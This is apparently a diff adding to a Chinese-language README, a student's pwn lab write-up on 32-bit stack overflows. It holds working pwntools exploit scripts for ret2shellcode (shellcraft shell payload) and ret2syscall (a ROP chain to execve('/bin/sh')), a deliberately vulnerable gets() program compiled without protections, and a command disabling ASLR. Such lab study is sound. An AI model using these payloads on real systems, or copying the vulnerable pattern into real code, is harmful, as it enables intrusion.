@@ -301,3 +301,150 @@ got.strncpy: 134520868
 ```
 
 然后发现程序中不存在mprotect...寄。但是程序动态链接了`libc.so.6`且存在puts()函数，应该可以通过定位libc来达成目标。
+
+但是停停，既然没有开NX为什么不直接把shellcode放到上一层的栈帧里面呢？
+
+新策略是直接把112字节填满，然后依次放入上一个栈帧的ESP以及shellcode，这样shellcode放到了上一个栈帧的屁股上，也就是其ESP的位置。
+
+```python
+pwn_obj = process("./ret2shellcode")
+target_addr = 外层ESP
+payload = b"#" * 112 + p32(target_addr) + asm(shellcraft.sh())
+pwn_obj.sendline(payload)
+pwn_obj.interactive()
+```
+
+但是这代表需要覆盖main()函数的外一层，按照gdb的信息就是__libc_start_call_main，但是我试了很久也没有成功，gdb给出的外部ESP也已经不在0xfffdd000~0xffffe000的栈地址范围内了，而且感觉对系统不太好，如果gets()外一层不是main()，而是一个随便啥函数应该也一样。所以现在重新编写一个C语言程序来观察一下这个猜想是否正确：
+
+```c
+#include <stdio.h>
+
+void func() {
+    char func_buf[100];
+    printf("this is ret2shellcode.mtx! gets: ");
+    gets(func_buf);
+    puts("goodbye");
+}
+
+int main() {
+    char main_buf[100] = {0};
+    func();
+    return 0;
+}
+```
+
+通过`gcc ret2shellcode.c -o ret2shellcode -m32 -g -fno-stack-protector -no-pie -z execstack`进行编译之后重新尝试分析：
+
+因为buf大小和之前去的一样所以偏差依旧是112字节，但这回变量buf是函数func()的临时变量，按照dbg给出的栈信息，当程序运行到func()函数时，内存中的栈结构应该是这样子的：
+
+![stack](./README.assets/stack.jpg)
+
+因此输入的数据应该是：
+
+* 112字节填充
+* 4字节的返回地址0xffffcec6
+* 16字节填充
+* 44字节shellcode
+
+但是在测试后发现仍然失败，原因是Linux默认开启的ASLR，gdb工具在调试二进制文件的时候会关闭地址的随机化，但是在外部执行时堆栈位置不固定，也就是说返回地址0xffffcec6在真实环境下是无效的，因为剩下的时间有限（而且还要给导师和组里的师兄打工），这里就直接尝试被关闭ASLR，不再进行尝试利用libc动态链接获取mprotect()函数的实验。
+
+首先通过`sysctl kernel.randomize_va_space=0`来关闭堆和栈的地址随机化，重新进入gdb来调试：
+
+![image-20230415135735932](./README.assets/image-20230415135735932.png)
+
+通过pwntools实例化进程并且调用gdb在func()函数插入断点，多次测试确认对战随机化已经关闭之后获取EBP为0xffffce88，按照之前的手画栈结构图，目标返回值的地址应该是当前的EBP加上16个字节，也就是0xffffce9c，修改目标地址后使用下面的代码进行测试：
+
+```python
+from pwn import *
+
+
+context.arch = "i386"
+context.os = "linux"
+context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+context.log_level='debug'
+
+pwn_obj = gdb.debug("./ret2shellcode", "b puts")
+target_addr = 0xffffce9c
+payload = b"#" * 112 + p32(target_addr) + b"#" * 12 + asm(shellcraft.sh())
+pwn_obj.sendline(payload)
+pwn_obj.interactive()
+```
+
+![image-20230415151913293](./README.assets/image-20230415151913293.png)
+
+👆步进到func()函数即将结束时，可以看到此时func()函数的外一层已经不是main()函数，而是0xffffce9c这个地址，而从这个地址开始就是`push 0x86`，也就是shellcode的起始语句了，到最后执行`int 0x80`，就可以获取到shell了：👇
+
+![image-20230415152431074](./README.assets/image-20230415152431074.png)
+
+执行玩这条汇编语句，gdb就炸了，因为shellcode就只是shellcode，没有清理痕迹，但是在外部已经可以成功获取到shell了（因为打开了pwntools的dubug所以显得有点乱）：
+
+![image-20230415152618851](./README.assets/image-20230415152618851.png)
+
+好耶！
+
+## 03 ret2syscall
+
+例行检查：
+
+![image-20230418161403074](./README.assets/image-20230418161403074.png)
+
+这次没有现成的`system(/bin/sh)`可以利用，同时也不能像ret2shellcode一样将shellcode放在可执行的内存区块里面。这个实验的目标是将系统调用编号放进EAX寄存器，将调用的参数放进EBX、ECX...寄存器，再用`INT 80`汇编指令执行。
+
+那么应该如何将数据放到指定的寄存器里面呢？方法就是在二进制程序的汇编代码段里面找到`POP EAX`这样的代码片段，代表将栈顶的一个字节（32位系统中）弹出放到EAX寄存器里面。如果有多个参数同时弹栈，则会展现出`POP EDX; POP ECX; POP EBX`这样反着来的形式，因为在栈里面越靠后的参数越靠近栈顶。最后，`RET`指令可以让栈顶字节弹出，并且跳转到那里。
+
+这里使用的系统调用和之前ret2shellcode一样，是`execve("/bin/sh", NULL, NULL)`，execve的系统调用号是11，计划放进EAX寄存器；三个参数一次放进EBX、ECX、EDX寄存器，当然放进EBX的数据不是"/bin/sh"字符串而是其在内存中的地址，这也代表了如果程序段中不存在"/bin/sh"字符串的话难度就完全不是一个级别了。总之，现在的目标就是：
+
+![stack-2](./README.assets/stack-2.jpg)
+
+图中引号括起来的部分不代表字符串，代表对应指令在代码段中地址。进行这样的溢出攻击之后，程序的流程及会变成这样（以下面红色的方案为例）：
+
+* main()函数结束，返回到代码段`POP EAX; RET`（此时main()函数返回同样调用了RET指令，因此此时栈顶是execve的调用号）。首先执行`POP EAX`将execve的调用号弹出并放进EAX寄存器中；然后执行`RET`将当前的栈顶字节弹出并跳转到这个字节所记录的地址。
+* 弹出的返回地址就是指令段`POP EDX; POP ECX; POP EBX; RET`的地址，按照语句顺序依次弹出NULL、NULL、“/bin/sh”地址到EDX、ECX、EBX寄存器中，然后再弹出栈顶字节并返回到该字节指向的地址。
+* 最后一个代码段就是`INT 0x80`，执行系统调用的最后一句话。
+
+好了，现在只需要把几个语句再代码段中的地址找出来就好了，然后组合起来再加上前置的112字节填充就可以咯！
+
+这里使用PwnTools提供的ROPgadget工具然找到想要的代码段所在的位置：
+
+![image-20230418173034807](./README.assets/image-20230418173034807.png)
+
+完美到好像是特意准备的呢！（叹息）总之地址找到了，开始写脚本：
+
+```python
+from pwn import *
+
+
+code_execve = 11
+addr_pop_eax_ret = 0x080bb196
+addr_pop_edx_pop_ecx_pop_ebx_ret = 0x0806eb90
+addr_bin_sh = 0x080be408
+addr_int_0x80 = 0x08049421
+
+pwn_obj = process("./ret2syscall")
+pwn_obj.sendline(
+    b"#" * 112 + 
+    p32(addr_pop_eax_ret) + 
+    p32(code_execve) + 
+    p32(addr_pop_edx_pop_ecx_pop_ebx_ret) + 
+    p32(0) + 
+    p32(0) + 
+    p32(addr_bin_sh) + 
+    p32(addr_int_0x80))
+pwn_obj.interactive()
+```
+
+看看效果：
+
+![image-20230418173436769](./README.assets/image-20230418173436769.png)
+
+## 04 ret2libc-1
+
+
+
+## 05 ret2libc-2
+
+
+
+## 06 ret2libc-3
+
+
